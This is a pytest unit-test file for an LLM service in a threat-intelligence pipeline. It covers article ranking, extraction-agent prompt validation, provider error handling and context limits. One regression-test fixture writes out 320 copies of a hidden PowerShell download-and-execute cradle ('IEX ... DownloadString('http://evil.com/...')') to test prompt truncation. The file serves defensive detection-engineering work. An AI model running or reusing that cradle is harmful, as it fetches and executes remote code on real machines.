"""Tests for LLM service agent methods: rank_article, run_extraction_agent, and HTTP error paths.

Covers: rank_article prompt assembly, score parsing, error handling;
run_extraction_agent empty content/prompt validation, HTTP errors,
retry exhaustion; and provider-specific call methods.
"""

from unittest.mock import AsyncMock, Mock, patch

import pytest

from src.services.llm_service import (
    MIN_USER_CONTENT_CHARS,
    LLMService,
    PreprocessInvariantError,
)

pytestmark = pytest.mark.unit


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def llm_service():
    """Create LLMService with mocked DB and OpenAI provider for all agents."""
    config_models = {
        "RankAgent": "gpt-4o-mini",
        "RankAgent_provider": "openai",
        "ExtractAgent": "gpt-4o-mini",
        "ExtractAgent_provider": "openai",
        "SigmaAgent": "gpt-4o-mini",
        "SigmaAgent_provider": "openai",
    }
    with patch("src.services.llm_service.DatabaseManager") as mock_db:
        mock_db.return_value.get_session.return_value.query.return_value.all.return_value = []
        svc = LLMService(config_models=config_models)
        svc.openai_api_key = "test-key"
        svc.workflow_openai_enabled = True
        return svc


_RANK_PROMPT_TEMPLATE = (
    '{"role": "You are a detection engineer.",'
    ' "user_template": "Title: {title}\\nSource: {source}\\nURL: {url}\\nContent:\\n{content}"}'
)

_EXTRACT_PROMPT_CFG = {
    "role": "You are an extractor.",
    "task": "Extract",
    "instructions": "Output JSON",
    "json_example": "{}",
}


# ---------------------------------------------------------------------------
# rank_article
# ---------------------------------------------------------------------------


class TestRankArticle:
    """Tests for LLMService.rank_article."""

    @pytest.mark.asyncio
    async def test_rank_article_requires_prompt_template(self, llm_service):
        """rank_article raises ValueError when no prompt_template is given."""
        with pytest.raises(ValueError, match="prompt_template must be provided"):
            await llm_service.rank_article(
                title="Test",
                content="x" * 1000,
                source="Blog",
                url="https://example.com",
                prompt_template=None,
            )

    @pytest.mark.asyncio
    async def test_rank_article_parses_score_from_llm_response(self, llm_service):
        """rank_article returns parsed score and reasoning from LLM."""
        llm_response = {
            "choices": [{"message": {"content": '{"score": 8, "reasoning": "High huntability"}'}}],
            "usage": {"prompt_tokens": 100, "completion_tokens": 50},
        }

        with (
            patch.object(llm_service, "request_chat", new_callable=AsyncMock, return_value=llm_response),
            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
        ):
            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
            result = await llm_service.rank_article(
                title="APT29 Dropper",
                content="x" * 2000,
                source="DFIR Report",
                url="https://example.com",
                prompt_template=_RANK_PROMPT_TEMPLATE,
            )

        assert "score" in result
        assert isinstance(result["score"], (int, float))
        assert "reasoning" in result

    @pytest.mark.asyncio
    async def test_rank_article_handles_llm_error(self, llm_service):
        """rank_article propagates exception on LLM call failure."""
        with (
            patch.object(
                llm_service,
                "request_chat",
                new_callable=AsyncMock,
                side_effect=RuntimeError("Connection refused"),
            ),
            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
        ):
            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
            with pytest.raises(RuntimeError, match="Connection refused"):
                await llm_service.rank_article(
                    title="Test",
                    content="x" * 2000,
                    source="Blog",
                    url="https://example.com",
                    prompt_template=_RANK_PROMPT_TEMPLATE,
                )

    @pytest.mark.asyncio
    async def test_rank_article_truncates_long_content(self, llm_service):
        """rank_article truncates content that exceeds context window."""
        long_content = "x" * 200_000
        llm_response = {
            "choices": [{"message": {"content": '{"score": 5, "reasoning": "moderate"}'}}],
            "usage": {},
        }

        with (
            patch.object(llm_service, "request_chat", new_callable=AsyncMock, return_value=llm_response) as mock_req,
            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
        ):
            mock_ctx.return_value = {"context_length": 4096, "is_sufficient": True, "method": "test"}
            await llm_service.rank_article(
                title="Test",
                content=long_content,
                source="Blog",
                url="https://example.com",
                prompt_template=_RANK_PROMPT_TEMPLATE,
            )

        # The content sent to request_chat should be shorter than the original
        call_messages = mock_req.call_args.kwargs.get("messages") or mock_req.call_args[1].get("messages", [])
        user_msg = next((m for m in call_messages if m.get("role") == "user"), {})
        assert len(user_msg.get("content", "")) < len(long_content)

    @pytest.mark.asyncio
    async def test_rank_article_raises_when_json_prompt_has_empty_system(self, llm_service):
        """JSON-format prompt with empty system/role keys must hard-fail (not silently use default).

        Regression: previously silently fell back to a hardcoded cybersecurity-analyst persona
        when the user's JSON prompt had an empty 'system'/'role' — masking misconfiguration.
        """
        prompt_with_empty_system = '{"system": "", "user": "Rank: {title} {source} {url} {content}"}'
        with pytest.raises(PreprocessInvariantError, match="RankAgent prompt resolved to an empty system message"):
            await llm_service.rank_article(
                title="Test",
                content="x" * 2000,
                source="Blog",
                url="https://example.com",
                prompt_template=prompt_with_empty_system,
            )

    @pytest.mark.asyncio
    async def test_rank_article_raises_when_json_prompt_missing_system_key(self, llm_service):
        """JSON prompt without any system/role key must hard-fail."""
        prompt_without_system = '{"user": "Rank: {title} {source} {url} {content}"}'
        with pytest.raises(PreprocessInvariantError, match="RankAgent prompt resolved to an empty system message"):
            await llm_service.rank_article(
                title="Test",
                content="x" * 2000,
                source="Blog",
                url="https://example.com",
                prompt_template=prompt_without_system,
            )

    @pytest.mark.asyncio
    async def test_rank_article_raw_text_prompt_does_not_hard_fail(self, llm_service):
        """Non-JSON (raw text) prompt uses the hardcoded default persona — no hard-fail.

        The hard-fail gate is specific to JSON-format prompts so that legacy raw-text
        templates (bootstrap defaults, file-based prompts) continue to work.
        """
        raw_text_prompt = (
            "Rank this article for huntability. Title: {title} Source: {source} URL: {url} Content: {content}"
        )
        llm_response = {
            "choices": [{"message": {"content": '{"score": 7, "reasoning": "raw-text works"}'}}],
            "usage": {},
        }
        with (
            patch.object(llm_service, "request_chat", new_callable=AsyncMock, return_value=llm_response),
            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
        ):
            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
            # Should not raise — the raw text falls through to the hardcoded-persona fallback
            result = await llm_service.rank_article(
                title="Test",
                content="x" * 2000,
                source="Blog",
                url="https://example.com",
                prompt_template=raw_text_prompt,
            )
        assert "score" in result


# ---------------------------------------------------------------------------
# run_extraction_agent -- validation
# ---------------------------------------------------------------------------


class TestRunExtractionAgentValidation:
    """Tests for run_extraction_agent input validation."""

    @pytest.mark.asyncio
    async def test_empty_content_raises_value_error(self, llm_service):
        """Empty content raises ValueError immediately."""
        with pytest.raises(ValueError, match="Empty content"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="",
                title="Test",
                url="https://example.com",
                prompt_config=_EXTRACT_PROMPT_CFG,
            )

    @pytest.mark.asyncio
    async def test_empty_prompt_config_raises_value_error(self, llm_service):
        """Empty prompt_config raises ValueError."""
        with pytest.raises(ValueError, match="Empty prompt_config"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config={},
            )

    @pytest.mark.asyncio
    async def test_no_model_configured_raises(self, llm_service):
        """When no model can be resolved, raises ValueError."""
        llm_service.model_extract = None
        with pytest.raises(ValueError, match="No model configured"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config={
                    "role": "You are an extractor.",
                    "instructions": "Output JSON.",
                    "json_example": "{}",
                },
            )

    @pytest.mark.asyncio
    async def test_user_template_key_raises(self, llm_service):
        """prompt_config with user_template key raises ValueError (scaffold is code-owned)."""
        bad_cfg = {
            "role": "You are an extractor.",
            "instructions": "Output JSON only.",
            "user_template": "Title: {title}\nContent: {content}",
        }
        with pytest.raises(ValueError, match="must not contain 'user_template'"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    async def test_missing_system_role_key_raises(self, llm_service):
        """prompt_config without system or role raises ValueError before any LLM call."""
        bad_cfg = {
            "instructions": "Output JSON only.",
            "json_example": "{}",
        }
        with pytest.raises(ValueError, match="missing required 'system'/'role' key"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    async def test_missing_instructions_key_raises(self, llm_service):
        """prompt_config without instructions raises ValueError before any LLM call."""
        bad_cfg = {
            "role": "You are an extractor.",
            "json_example": "{}",
        }
        with pytest.raises(ValueError, match="missing required 'instructions' key"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    async def test_invalid_json_in_json_example_raises(self, llm_service):
        """json_example that is not valid JSON raises ValueError."""
        bad_cfg = {
            "role": "You are an extractor.",
            "instructions": "Output JSON only.",
            "json_example": "{not valid json",
        }
        with pytest.raises(ValueError, match="json_example is not valid JSON"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    async def test_null_json_example_raises(self, llm_service):
        """prompt_config with json_example: null raises ValueError."""
        bad_cfg = {
            "role": "You are an extractor.",
            "instructions": "Output JSON only.",
            "json_example": None,
        }
        with pytest.raises(ValueError, match="missing required 'json_example'"):
            await llm_service.run_extraction_agent(
                agent_name="HuntQueriesExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    async def test_json_example_missing_traceability_fields_raises(self, llm_service):
        """json_example present but missing traceability fields raises ValueError."""
        bad_cfg = {
            "role": "You are an extractor.",
            "instructions": "Output JSON only.",
            "json_example": '{"cmdline_items": [{"value": "cmd.exe"}], "count": 1}',
        }
        with pytest.raises(ValueError, match="missing traceability fields"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )

    @pytest.mark.asyncio
    @pytest.mark.regression
    async def test_structured_extractor_without_value_field_passes_validation(self, llm_service):
        """Structured extractors with domain-specific identity fields must NOT be rejected.

        Regression: ScheduledTasksExtract json_example uses task_name/task_path/trigger
        as identity anchors and was incorrectly rejected by the Extractor Contract validator
        because it lacked a generic 'value' field. The fix makes 'value' optional when
        domain-specific fields are present alongside source_evidence/extraction_justification/
        confidence_score.
        """
        from unittest.mock import AsyncMock, patch

        structured_json_example = (
            '{"scheduled_tasks": [{'
            '"task_name": "PersistenceTask", '
            '"task_path": "\\\\Microsoft\\\\Windows\\\\PersistenceTask", '
            '"trigger": "LogonTrigger", '
            '"principal": "SYSTEM", '
            '"source_evidence": "Malware creates scheduled task on logon.", '
            '"extraction_justification": "Explicit task identity from source.", '
            '"confidence_score": 0.9'
            "}], "
            '"count": 1}'
        )
        cfg = {
            "role": "You are a scheduled-task extractor. LITERAL TEXT EXTRACTOR. sub-agent of ExtractAgent.",
            "task": "Extract scheduled tasks from threat report.",
            "instructions": "Output ONLY valid JSON. When in doubt OMIT. source_evidence extraction_justification confidence_score",
            "json_example": structured_json_example,
        }
        with patch.object(llm_service, "request_chat", new_callable=AsyncMock) as mock_chat:
            mock_chat.return_value = {
                "choices": [{"message": {"content": '{"scheduled_tasks": [], "count": 0}'}}],
                "usage": {},
            }
            result = await llm_service.run_extraction_agent(
                agent_name="ScheduledTasksExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=cfg,
            )
        assert "error" not in result, f"Structured extractor should not fail validation: {result.get('error')}"

    @pytest.mark.asyncio
    @pytest.mark.regression
    async def test_simple_extractor_without_value_or_domain_fields_still_fails(self, llm_service):
        """Simple extractor items that lack BOTH 'value' AND domain fields must still be rejected."""
        bad_cfg = {
            "role": "You are an extractor. LITERAL TEXT EXTRACTOR. sub-agent of ExtractAgent.",
            "instructions": "Output ONLY valid JSON. When in doubt OMIT. source_evidence extraction_justification confidence_score",
            "json_example": (
                '{"cmdline_items": [{'
                '"source_evidence": "cmd.exe was run", '
                '"extraction_justification": "direct quote", '
                '"confidence_score": 0.9'
                "}], "
                '"count": 1}'
            ),
        }
        with pytest.raises(ValueError, match="missing 'value' field"):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=bad_cfg,
            )


# ---------------------------------------------------------------------------
# run_extraction_agent -- success and error paths
# ---------------------------------------------------------------------------


class TestRunExtractionAgentExecution:
    """Tests for run_extraction_agent success and failure scenarios."""

    @pytest.mark.asyncio
    async def test_successful_extraction_returns_items(self, llm_service):
        """Happy path: LLM returns valid JSON, extraction returns items."""
        response_json = '{"cmdline_items": [{"value": "cmd.exe /c whoami"}], "count": 1}'
        llm_response = {
            "choices": [{"message": {"content": response_json}}],
            "usage": {},
        }

        with patch.object(llm_service, "request_chat", new_callable=AsyncMock, return_value=llm_response):
            result = await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=_EXTRACT_PROMPT_CFG,
            )

        assert result["count"] == 1
        assert len(result["cmdline_items"]) == 1

    @pytest.mark.asyncio
    async def test_extraction_retries_on_invalid_json(self, llm_service):
        """Invalid JSON on first try -> retries, then returns fallback result."""
        bad_response = {
            "choices": [{"message": {"content": "This is not JSON at all"}}],
            "usage": {},
        }
        good_response = {
            "choices": [{"message": {"content": '{"items": [], "count": 0}'}}],
            "usage": {},
        }

        with patch.object(
            llm_service,
            "request_chat",
            new_callable=AsyncMock,
            side_effect=[bad_response, good_response],
        ):
            result = await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=_EXTRACT_PROMPT_CFG,
                max_extraction_retries=2,
            )

        # Should eventually return a result (either parsed or fallback)
        assert "count" in result or "items" in result

    @pytest.mark.asyncio
    async def test_extraction_all_retries_exhausted_returns_error(self, llm_service):
        """All retries fail -> returns error result, does not raise."""
        with patch.object(
            llm_service,
            "request_chat",
            new_callable=AsyncMock,
            side_effect=RuntimeError("API timeout"),
        ):
            result = await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content="x" * MIN_USER_CONTENT_CHARS,
                title="Test",
                url="https://example.com",
                prompt_config=_EXTRACT_PROMPT_CFG,
                max_extraction_retries=1,
            )

        assert result.get("error") is not None
        assert result.get("error_type") == "RuntimeError"
        assert result.get("items") == []
        assert result.get("count") == 0

    @pytest.mark.asyncio
    @pytest.mark.regression
    async def test_snippet_cap_preserves_article_in_prompt(self, llm_service):
        """300+ snippets must not crowd out the article content in the LLM prompt.

        Regression for article_2068: preprocessor produced 323 snippets which
        consumed the entire context, leaving 0 chars for the article (0/7 extracted
        with preprocessor ON vs 6/7 with it OFF).
        """
        article_text = "UNIQUE_ARTICLE_CONTENT " + "x" * MIN_USER_CONTENT_CHARS

        fat_snippets = [
            f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
            for i in range(320)
        ]

        captured_messages = []

        async def capture_request_chat(**kwargs):
            captured_messages.extend(kwargs.get("messages", []))
            return {"choices": [{"message": {"content": '{"items":[],"count":0}'}}], "usage": {}}

        with (
            patch(
                "src.services.cmdline_attention_preprocessor.process",
                return_value={"high_likelihood_snippets": fat_snippets, "full_article": article_text},
            ),
            patch.object(llm_service, "_get_context_limit", return_value=4000),
            patch.object(llm_service, "request_chat", side_effect=capture_request_chat),
        ):
            await llm_service.run_extraction_agent(
                agent_name="CmdlineExtract",
                content=article_text,
                title="Dense Article",
                url="https://example.com",
                prompt_config=_EXTRACT_PROMPT_CFG,
                max_extraction_retries=1,
                attention_preprocessor_enabled=True,
            )

        assert captured_messages, "request_chat was not called"
        full_prompt = " ".join(m.get("content", "") for m in captured_messages)
        assert "UNIQUE_ARTICLE_CONTENT" in full_prompt, (
            "Article content was crowded out by snippet runaway -- cap is not working"
        )


# ---------------------------------------------------------------------------
# Provider HTTP call methods -- _call_openai_chat, _call_anthropic_chat
# ---------------------------------------------------------------------------


class TestCallOpenAI:
    """Tests for _call_openai_chat."""

    @pytest.mark.asyncio
    async def test_openai_empty_messages_raises_preprocess_error(self, llm_service):
        """Empty messages should raise PreprocessInvariantError."""
        with pytest.raises(PreprocessInvariantError, match="empty messages"):
            await llm_service._call_openai_chat(
                messages=[],
                model_name="gpt-4o-mini",
                temperature=0.0,
                max_tokens=1000,
                timeout=30.0,
            )

    @pytest.mark.asyncio
    async def test_openai_missing_api_key_raises(self, llm_service):
        """Missing API key raises RuntimeError."""
        llm_service.openai_api_key = None
        with pytest.raises(RuntimeError, match="API key not configured"):
            await llm_service._call_openai_chat(
                messages=[{"role": "user", "content": "hello"}],
                model_name="gpt-4o-mini",
                temperature=0.0,
                max_tokens=1000,
                timeout=30.0,
            )

    @pytest.mark.asyncio
    async def test_openai_non_200_raises(self, llm_service):
        """Non-200 response raises RuntimeError."""
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.text = "Internal Server Error"

        with patch("httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.post = AsyncMock(return_value=mock_response)
            mock_client_cls.return_value.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client_cls.return_value.__aexit__ = AsyncMock(return_value=None)

            with pytest.raises(RuntimeError, match="OpenAI API error"):
                await llm_service._call_openai_chat(
                    messages=[{"role": "user", "content": "hello"}],
                    model_name="gpt-4o-mini",
                    temperature=0.0,
                    max_tokens=1000,
                    timeout=30.0,
                )


class TestCallAnthropic:
    """Tests for _call_anthropic_chat."""

    @pytest.mark.asyncio
    async def test_anthropic_empty_messages_raises_preprocess_error(self, llm_service):
        """Empty messages should raise PreprocessInvariantError."""
        with pytest.raises(PreprocessInvariantError, match="empty messages"):
            await llm_service._call_anthropic_chat(
                messages=[],
                model_name="claude-sonnet-4-5",
                temperature=0.0,
                max_tokens=1000,
                timeout=30.0,
            )

    @pytest.mark.asyncio
    async def test_anthropic_missing_api_key_raises(self, llm_service):
        """Missing API key raises RuntimeError."""
        llm_service.anthropic_api_key = None
        with pytest.raises(RuntimeError, match="API key not configured"):
            await llm_service._call_anthropic_chat(
                messages=[{"role": "user", "content": "hello"}],
                model_name="claude-sonnet-4-5",
                temperature=0.0,
                max_tokens=1000,
                timeout=30.0,
            )

    @pytest.mark.asyncio
    async def test_anthropic_normalizes_response_to_openai_format(self, llm_service):
        """Anthropic response is normalized to OpenAI-style choices format."""
        llm_service.anthropic_api_key = "test-anthropic-key"
        anthropic_response_body = {
            "content": [{"type": "text", "text": "Analysis result"}],
            "usage": {"input_tokens": 50, "output_tokens": 20},
            "stop_reason": "end_turn",
            "model": "claude-sonnet-4-5",
        }

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = anthropic_response_body

        with patch.object(
            llm_service,
            "_call_anthropic_with_retry",
            new_callable=AsyncMock,
            return_value=mock_response,
        ):
            result = await llm_service._call_anthropic_chat(
                messages=[
                    {"role": "system", "content": "You are an analyst."},
                    {"role": "user", "content": "Analyze this article."},
                ],
                model_name="claude-sonnet-4-5",
                temperature=0.0,
                max_tokens=1000,
                timeout=30.0,
            )

        assert "choices" in result
        assert result["choices"][0]["message"]["content"] == "Analysis result"
        assert result.get("stop_reason") == "end_turn"


# ---------------------------------------------------------------------------
# Context limit and truncation
# ---------------------------------------------------------------------------


class TestContextLimit:
    """Tests for _get_context_limit."""

    def test_lmstudio_returns_local_limit(self, llm_service):
        limit = llm_service._get_context_limit("lmstudio")
        assert limit == llm_service.assumed_lmstudio_context_tokens

    def test_openai_returns_cloud_limit(self, llm_service):
        limit = llm_service._get_context_limit("openai")
        assert limit == llm_service.assumed_cloud_context_tokens

    def test_anthropic_returns_cloud_limit(self, llm_service):
        limit = llm_service._get_context_limit("anthropic")
        assert limit == llm_service.assumed_cloud_context_tokens

    def test_none_provider_defaults_to_lmstudio(self, llm_service):
        limit = llm_service._get_context_limit(None)
        assert limit == llm_service.assumed_lmstudio_context_tokens

    def test_known_model_returns_catalog_value(self, llm_service):
        limit = llm_service._get_context_limit("openai", model_name="gpt-4o")
        assert limit == 128_000

    def test_unknown_model_falls_back_to_provider_default(self, llm_service):
        limit = llm_service._get_context_limit("openai", model_name="not-a-real-model")
        assert limit == llm_service.assumed_cloud_context_tokens

    def test_model_lookup_takes_priority_over_provider_default(self, llm_service):
        limit_with_model = llm_service._get_context_limit("openai", model_name="gpt-4.1")
        limit_without = llm_service._get_context_limit("openai")
        assert limit_with_model == 1_047_576
        assert limit_with_model != limit_without


# ---------------------------------------------------------------------------
# Ground truth computation edge cases
# ---------------------------------------------------------------------------


class TestComputeRankGroundTruthEdgeCases:
    """Additional edge cases for compute_rank_ground_truth."""

    def test_boundary_scores_produce_correct_rank(self, llm_service):
        """Mean of 5 should round to 10, mapping to rank 1."""
        result = llm_service.compute_rank_ground_truth(5.0, 5.0)
        assert result["ground_truth_rank"] == 1.0

    def test_max_scores_produce_rank_10(self, llm_service):
        """Mean of 100 should produce rank 10."""
        result = llm_service.compute_rank_ground_truth(100.0, 100.0)
        assert result["ground_truth_rank"] == 10.0

    def test_mixed_none_returns_none_rank(self, llm_service):
        """One None score -> no ground truth."""
        result = llm_service.compute_rank_ground_truth(85.0, None)
        assert result["ground_truth_rank"] is None
        assert result["hunt_score"] == 85.0
        assert result["ml_score"] is None

    def test_string_scores_are_parsed(self, llm_service):
        """String scores should be parsed to float."""
        result = llm_service.compute_rank_ground_truth("70", "80")
        assert result["ground_truth_rank"] is not None
        assert result["ground_truth_mean"] == 75.0
